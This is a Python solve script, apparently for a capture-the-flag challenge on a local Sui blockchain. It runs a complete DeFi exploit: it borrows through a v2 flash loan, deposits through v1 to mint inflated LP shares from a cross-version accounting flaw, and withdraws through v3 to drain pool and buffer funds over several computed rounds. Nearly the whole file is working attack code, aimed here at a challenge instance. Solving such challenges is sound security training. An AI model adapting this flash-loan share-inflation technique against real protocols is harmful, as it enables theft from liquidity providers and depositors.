import asyncio
import time
from types import SimpleNamespace
from urllib.parse import urlparse

import requests
from grpclib.client import Channel
from pysui import ExecuteTransaction, GetObject, GrpcProtocolClient
from pysui.sui.sui_bcs import bcs
from pysui.sui.sui_crypto import keypair_from_keystring


class SyncAsync:
    def __init__(self):
        self._runner = asyncio.Runner()
        asyncio.set_event_loop(self._runner.get_loop())

    def run(self, awaitable):
        return self._runner.run(awaitable)

    def close(self):
        asyncio.set_event_loop(None)
        self._runner.close()


url = "http://localhost"
sync = SyncAsync()

# Challenge constants, mirrored from setup.move and the mock pools
flash_principal = 20_000_000_000_000_000
flash_fee_bps = 9
bps_denominator = 10_000
flash_fee = (flash_principal * flash_fee_bps + bps_denominator - 1) // bps_denominator
required_repayment = flash_principal + flash_fee

residual_limit_base = 25_000_000_000_000_000
residual_limit_quote = 100_000_000
base_decimal_factor = 1_000_000_000_000
oracle_price_e6 = 2_500_000_000
quote_price_scale = 1_000_000

# Compute the exact number of exploit PTBs before sending transactions
# mirrors the Move integer floors and the known mock-pool constants
# Round 0 is the flash-loan round, subsequent rounds recycle attacker-owned withdrawals
model_lp_supply = 6_000_000
model_buffer_base = 20_000_000_000_000_000
model_buffer_quote = 1_000_000
model_old_counter_base = 1_000_000_000_000_000_000
model_old_counter_quote = 2_500_000_000
model_travel_counter_base = 14_000_000_000_000_000_000
model_travel_counter_quote = 55_000_000_000
model_old_counter_fee_base = 5_000_000_000_000_000
model_old_counter_fee_quote = 12_500_000
model_old_counter_reward_base = 2_000_000_000_000_000
model_old_counter_reward_quote = 5_000_000
model_travel_counter_fee_base = 2_000_000_000_000_000
model_travel_counter_fee_quote = 5_000_000
model_travel_counter_reward_base = 1_000_000_000_000_000
model_travel_counter_reward_quote = 2_500_000
model_accounted_base_after_v1_refresh = 1_000_000_000_000
model_accounted_quote_after_v1_refresh = 1
model_attacker_base = 1_000_000_000_000_000
model_attacker_quote = 1_000_000
model_rounds = 0
model_solved = False

while not model_solved:
    if model_rounds == 0:
        model_buffer_base -= flash_principal
        model_attacker_base += flash_principal

    model_last_aum = (
        (
            (model_accounted_base_after_v1_refresh + model_buffer_base)
            // base_decimal_factor
        )
        * oracle_price_e6
        // quote_price_scale
        + model_accounted_quote_after_v1_refresh
        + model_buffer_quote
    )
    model_deposit_value = (
        model_attacker_base // base_decimal_factor
    ) * oracle_price_e6 // quote_price_scale + model_attacker_quote
    model_inflated_lp = model_lp_supply * model_deposit_value // model_last_aum
    model_lp_supply += model_inflated_lp
    model_share_numerator = model_inflated_lp
    model_share_denominator = model_lp_supply
    model_lp_supply -= model_inflated_lp

    model_buffer_base += model_attacker_base
    model_buffer_quote += model_attacker_quote
    model_withdrawn_base = 0
    model_withdrawn_quote = 0

    model_fee_base = model_old_counter_fee_base + model_travel_counter_fee_base
    model_fee_quote = model_old_counter_fee_quote + model_travel_counter_fee_quote
    model_old_counter_base -= model_old_counter_fee_base
    model_old_counter_quote -= model_old_counter_fee_quote
    model_travel_counter_base -= model_travel_counter_fee_base
    model_travel_counter_quote -= model_travel_counter_fee_quote
    model_share_base = model_fee_base * model_share_numerator // model_share_denominator
    model_share_quote = (
        model_fee_quote * model_share_numerator // model_share_denominator
    )
    model_withdrawn_base += model_share_base
    model_withdrawn_quote += model_share_quote
    model_buffer_base += model_fee_base - model_share_base
    model_buffer_quote += model_fee_quote - model_share_quote

    model_reward_base = model_old_counter_reward_base + model_travel_counter_reward_base
    model_reward_quote = model_old_counter_reward_quote + model_travel_counter_reward_quote
    model_old_counter_base -= model_old_counter_reward_base
    model_old_counter_quote -= model_old_counter_reward_quote
    model_travel_counter_base -= model_travel_counter_reward_base
    model_travel_counter_quote -= model_travel_counter_reward_quote
    model_share_base = (
        model_reward_base * model_share_numerator // model_share_denominator
    )
    model_share_quote = (
        model_reward_quote * model_share_numerator // model_share_denominator
    )
    model_withdrawn_base += model_share_base
    model_withdrawn_quote += model_share_quote
    model_buffer_base += model_reward_base - model_share_base
    model_buffer_quote += model_reward_quote - model_share_quote

    model_old_counter_fee_base = model_old_counter_fee_quote = 0
    model_old_counter_reward_base = model_old_counter_reward_quote = 0
    model_travel_counter_fee_base = model_travel_counter_fee_quote = 0
    model_travel_counter_reward_base = model_travel_counter_reward_quote = 0

    model_share_base = (
        model_old_counter_base * model_share_numerator // model_share_denominator
    )
    model_share_quote = (
        model_old_counter_quote * model_share_numerator // model_share_denominator
    )
    model_old_counter_base -= model_share_base
    model_old_counter_quote -= model_share_quote
    model_withdrawn_base += model_share_base
    model_withdrawn_quote += model_share_quote

    model_share_base = (
        model_travel_counter_base * model_share_numerator // model_share_denominator
    )
    model_share_quote = (
        model_travel_counter_quote * model_share_numerator // model_share_denominator
    )
    model_travel_counter_base -= model_share_base
    model_travel_counter_quote -= model_share_quote
    model_withdrawn_base += model_share_base
    model_withdrawn_quote += model_share_quote

    model_share_base = (
        model_buffer_base * model_share_numerator // model_share_denominator
    )
    model_share_quote = (
        model_buffer_quote * model_share_numerator // model_share_denominator
    )
    model_buffer_base -= model_share_base
    model_buffer_quote -= model_share_quote
    model_withdrawn_base += model_share_base
    model_withdrawn_quote += model_share_quote

    if model_rounds == 0:
        assert model_withdrawn_base >= required_repayment
        model_withdrawn_base -= required_repayment
        model_buffer_base += required_repayment

    model_attacker_base = model_withdrawn_base
    model_attacker_quote = model_withdrawn_quote
    model_rounds += 1
    model_solved = (
        model_buffer_base <= residual_limit_base
        and model_old_counter_base <= residual_limit_base
        and model_travel_counter_base <= residual_limit_base
        and model_buffer_quote <= residual_limit_quote
        and model_old_counter_quote <= residual_limit_quote
        and model_travel_counter_quote <= residual_limit_quote
    )
    if model_rounds > 8:
        raise RuntimeError("math model did not converge")

total_rounds = model_rounds
print(
    f"flash fee {flash_fee}; required repayment {required_repayment}; exploit rounds {total_rounds}"
)

# 1. Connect to the challenge API
state = requests.get(f"{url}/api/instance", timeout=10).json()

# 2. Start/poll the instance
if state["deployment"] is None:
    requests.post(f"{url}/api/instance/start", timeout=180)
    for _ in range(60):
        time.sleep(1)
        state = requests.get(f"{url}/api/instance", timeout=10).json()
        if state["deployment"] is not None:
            break

deployment = state["deployment"]
if deployment is None:
    raise RuntimeError(state)

# 3. Read deployment IDs.
ids = deployment["objectIds"]
rpc = urlparse(deployment["rpcUrl"])
player_address = deployment["playerAddress"]
claim_marks_package = ids["claimMarksPackage"]
coin_a_type = f"{claim_marks_package}::pale_wax::PALE_WAX"
coin_b_type = f"{claim_marks_package}::gold_fleck::GOLD_FLECK"
sui_package = "0x" + "0" * 63 + "2"
coin_a_object_type = f"{sui_package}::coin::Coin<{coin_a_type}>"
coin_b_object_type = f"{sui_package}::coin::Coin<{coin_b_type}>"

# 4. Create the Sui client/account
player_keypair = keypair_from_keystring(deployment["playerPrivateKey"])
profile = SimpleNamespace(
    profile_name="localnet",
    url=f"http://{rpc.hostname}:{rpc.port or 80}",
)
group = SimpleNamespace(
    active_profile=profile,
    using_profile=profile.profile_name,
    get_transient_keypair=lambda **_: player_keypair,
    keypair_for_address=lambda **_: player_keypair,
)
config = SimpleNamespace(
    active_address=player_address,
    active_group=group,
    active_profile=profile.profile_name,
)
client = GrpcProtocolClient(pysui_config=config)
client._channel.close()
client._channel = Channel(rpc.hostname, rpc.port or 80, ssl=False)
sync.run(client._init_protocol())

try:
    # 5. Claim player coins
    tx = sync.run(client.transaction())
    claimed_base, claimed_quote = sync.run(
        tx.move_call(
            target=f"{deployment['packageId']}::setup::claim",
            arguments=[deployment["challengeObjectId"]],
        )
    )
    sync.run(
        tx.transfer_objects(
            transfers=[claimed_base, claimed_quote], recipient=player_address
        )
    )
    built = sync.run(tx.build_and_sign())
    result = sync.run(client.execute(command=ExecuteTransaction(**built)))
    if result.is_err():
        raise RuntimeError(result.result_string)
    if not result.result_data.effects.status.success:
        raise RuntimeError(result.result_data.effects.status.error)
    print("claim", result.result_data.digest)
    time.sleep(1)

    owned_base = [
        bcs.ObjectReference.from_grpc_ref(obj)
        for obj in result.result_data.objects.objects
        if obj.object_type == coin_a_object_type
        and obj.owner.address == player_address
        and obj.previous_transaction == result.result_data.digest
    ]
    owned_quote = [
        bcs.ObjectReference.from_grpc_ref(obj)
        for obj in result.result_data.objects.objects
        if obj.object_type == coin_b_object_type
        and obj.owner.address == player_address
        and obj.previous_transaction == result.result_data.digest
    ]

    # 6. Load shared object references once
    shared_objects = {}
    for name in (
        "house",
        "config",
        "versioned",
        "oracle",
        "priceInfo",
        "oldCounterPool",
        "travelCounterPool",
    ):
        object_result = sync.run(client.execute(command=GetObject(object_id=ids[name])))
        shared_objects[name] = bcs.ObjectArg(
            "SharedObject",
            bcs.SharedObjectReference.from_grpc_ref(
                object_result.result_data,
                name in ("house", "oracle", "oldCounterPool", "travelCounterPool"),
            ),
        )
    clock_result = sync.run(client.execute(command=GetObject(object_id="0x6")))
    clock = bcs.ObjectArg(
        "SharedObject",
        bcs.SharedObjectReference.from_grpc_ref(clock_result.result_data),
    )
    house = shared_objects["house"]
    global_config = shared_objects["config"]
    versioned = shared_objects["versioned"]
    oracle = shared_objects["oracle"]
    price_info = shared_objects["priceInfo"]
    old_counter_pool = shared_objects["oldCounterPool"]
    travel_counter_pool = shared_objects["travelCounterPool"]

    # 7. Execute the exact number of exploit rounds computed above.
    # Round 1 is flash-loan backed, later rounds recycle the previous withdrawal
    for round_index in range(total_rounds):
        tx = sync.run(client.transaction())
        working_base = owned_base[0]
        working_quote = owned_quote[0]

        if len(owned_base) > 1:
            sync.run(tx.merge_coins(merge_to=working_base, merge_from=owned_base[1:]))
        if len(owned_quote) > 1:
            sync.run(tx.merge_coins(merge_to=working_quote, merge_from=owned_quote[1:]))

        if round_index == 0:
            # Borrow from v2, requires principal + 9 bps before the PTB can finish
            borrowed_base, flash_receipt = sync.run(
                tx.move_call(
                    target=f"{ids['v2']}::flash::flash_loan_base",
                    arguments=[house, global_config, versioned, flash_principal],
                )
            )
            sync.run(tx.merge_coins(merge_to=working_base, merge_from=[borrowed_base]))

        # Refresh accounting through v1, preserving the vulnerable v1 valuation
        sync.run(
            tx.move_call(
                target=f"{ids['witnessOraclePackage']}::oracle::update_price",
                arguments=[oracle, price_info, clock],
            )
        )
        sync.run(
            tx.move_call(
                target=f"{ids['v1']}::accounting::refresh_aum",
                arguments=[house, versioned, old_counter_pool, oracle, clock],
            )
        )

        # Deposit through v1 to mint inflated LP from the cross-version denominator
        inflated_lp = sync.run(
            tx.move_call(
                target=f"{ids['v1']}::accounting::deposit",
                arguments=[
                    house,
                    global_config,
                    versioned,
                    working_base,
                    working_quote,
                ],
            )
        )

        # Withdraw through v3 so the inflated LP routes through both pool legs
        withdraw_receipt = sync.run(
            tx.move_call(
                target=f"{ids['v3']}::withdraw::new_withdraw_cert",
                arguments=[house, global_config, versioned, inflated_lp],
            )
        )
        sync.run(
            tx.move_call(
                target=f"{ids['v3']}::withdraw::collect_position_fees",
                arguments=[house, withdraw_receipt, old_counter_pool, travel_counter_pool],
            )
        )
        sync.run(
            tx.move_call(
                target=f"{ids['v3']}::withdraw::collect_position_rewards",
                arguments=[house, withdraw_receipt, old_counter_pool, travel_counter_pool],
            )
        )
        sync.run(
            tx.move_call(
                target=f"{ids['v3']}::withdraw::process_old_counter",
                arguments=[house, withdraw_receipt, old_counter_pool],
            )
        )
        sync.run(
            tx.move_call(
                target=f"{ids['v3']}::withdraw::withdraw_travel_counter",
                arguments=[house, withdraw_receipt, travel_counter_pool],
            )
        )
        sync.run(
            tx.move_call(
                target=f"{ids['v3']}::withdraw::process_buffer",
                arguments=[house, withdraw_receipt],
            )
        )
        withdrawn_base, withdrawn_quote = sync.run(
            tx.move_call(
                target=f"{ids['v3']}::withdraw::complete_withdraw",
                arguments=[house, withdraw_receipt],
            )
        )

        if round_index == 0:
            # Split principal + fee and repay with the v2 receipt in the same PTB
            repayment_base = sync.run(
                tx.split_coin(coin=withdrawn_base, amounts=[required_repayment])
            )
            sync.run(
                tx.move_call(
                    target=f"{ids['v2']}::flash::repay_flash_loan_base",
                    arguments=[house, flash_receipt, repayment_base],
                )
            )

        attacker_profit_base = withdrawn_base
        attacker_profit_quote = withdrawn_quote
        sync.run(
            tx.transfer_objects(
                transfers=[attacker_profit_base, attacker_profit_quote],
                recipient=player_address,
            )
        )

        built = sync.run(tx.build_and_sign())
        result = sync.run(client.execute(command=ExecuteTransaction(**built)))
        if result.is_err():
            raise RuntimeError(result.result_string)
        if not result.result_data.effects.status.success:
            raise RuntimeError(result.result_data.effects.status.error)

        print(
            ("flash" if round_index == 0 else f"recycle {round_index}"),
            result.result_data.digest,
        )
        time.sleep(1)

        owned_base = [
            bcs.ObjectReference.from_grpc_ref(obj)
            for obj in result.result_data.objects.objects
            if obj.object_type == coin_a_object_type
            and obj.owner.address == player_address
            and obj.previous_transaction == result.result_data.digest
        ]
        owned_quote = [
            bcs.ObjectReference.from_grpc_ref(obj)
            for obj in result.result_data.objects.objects
            if obj.object_type == coin_b_object_type
            and obj.owner.address == player_address
            and obj.previous_transaction == result.result_data.digest
        ]

    print("Solved, get the flag")
finally:
    sync.run(client.close())
    sync.close()
